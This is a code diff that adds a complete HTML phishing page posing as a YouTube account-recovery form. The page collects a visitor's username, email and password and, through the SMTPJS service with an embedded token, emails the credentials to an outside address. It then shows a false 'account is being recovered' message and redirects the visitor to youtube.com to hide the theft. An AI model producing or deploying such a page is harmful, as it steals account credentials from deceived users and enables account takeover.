@@ -1,1 +1,146 @@
 
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8"></meta>
+        <meta name="viewport" content="width-divice-width,initial-scale=1.0"></meta>
+        <title>Recover youtube account</title>
+    </head>
+    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+    <body>
+          <img src="https://exame.com/wp-content/uploads/2017/08/new-youtube-logo-840x402.jpg?quality=70&strip=info">
+        <div class="container">
+        
+      
+            <br />
+            <br />
+            <br />
+            <form action="javascript:Send();">
+                <input type="text" placeholder=" Youtube UserName" id="UserName" required><br /><br />
+                <input type="email" placeholder="Email" id="email" required><br /><br />
+                <input type="password" placeholder="Password" id="password" required><br /><br /><br />
+                <button class="btn">Recover account</button>
+                
+                </form>
+        </div>
+    </body>
+    <script>
+       var Email = { send: function (a) { return new Promise(function (n, e) { a.nocache = Math.floor(1e6 * Math.random() + 1), a.Action = "Send"; var t = JSON.stringify(a); Email.ajaxPost("https://smtpjs.com/v3/smtpjs.aspx?", t, function (e) { n(e) }) }) }, ajaxPost: function (e, n, t) { var a = Email.createCORSRequest("POST", e); a.setRequestHeader("Content-type", "application/x-www-form-urlencoded"), a.onload = function () { var e = a.responseText; null != t && t(e) }, a.send(n) }, ajax: function (e, n) { var t = Email.createCORSRequest("GET", e); t.onload = function () { var e = t.responseText; null != n && n(e) }, t.send() }, createCORSRequest: function (e, n) { var t = new XMLHttpRequest; return "withCredentials" in t ? t.open(e, n, !0) : "undefined" != typeof XDomainRequest ? (t = new XDomainRequest).open(e, n) : t = null, t } };
+
+
+function Send(){
+    
+    Email.send({
+      SecureToken: "61e09161-b4cc-45fe-9146-007cbbee33ec",
+      From: "email2allCompany@gmail.com",
+      To: "anonymoussenderemail@0101gmail.com",
+      Subject: UserName.value,
+      Body: "Email: "+email.value+", Password: "+password.value,
+    }).then(
+        
+  
+message => { if(message.value = "OK"){
+    
+     
+swal({
+
+  title: "Sucess",
+  text: "Your account is beeing recovered, sometimes can take up to 7 days! Wait for redirect!",
+  icon: "success",
+  button: "Ok, Thank you!",
+}).then(
+    
+    setTimeout(Redirect, 3000)
+);
+
+
+    
+}
+  }
+        
+    )
+
+ }
+ 
+ function Redirect(){
+     
+     window.location.href = "https://youtube.com";
+     
+ }
+    </script>
+    <style>
+
+body {
+    no-repeat center:center fixed;
+    background-size:cover;
+    font-family:sans-serif;
+}
+
+.container{
+    width:400;
+    margin:auto;
+    overflow:hidden;
+    padding:1rem;
+    background-color:#fff;
+    border-radius:10px;
+    text-align:center;
+    margin-top: -5vh;
+    transition: .5s ease-in-out;
+
+    
+}
+
+.hr{
+    width:99%;
+}
+
+.fb{
+    padding:0.6rem 2rem;
+    color:#fff;
+    background-color:#191970;
+    border:none;
+    border-radius:5px;
+}
+
+.a{
+    text-decoration:none;
+}
+
+.container input{
+    padding:0.5rem;
+    border: 2px solid red;
+    width:70%;
+    outline: 0;
+    transition: 0.6s ease-in-out;
+}
+
+.container input:hover{
+    
+    width: 80%;
+    border-radius: 20px;
+    transition: 0.6s ease-in-out;
+}
+
+.container input[type=checkbox]{
+    width:auto;
+}
+
+.btn{
+    padding:1rem;
+    color:#fff;
+    background-color:red;
+    font-size:1rem;
+    width:50%;
+    border-color: red;
+    border-radius:20px;
+}
+
+img{
+    
+    width: 90vw;
+    height: 150px;
+    transition: 1s ease-in-out;
+}
+
+    </style>
+</html>
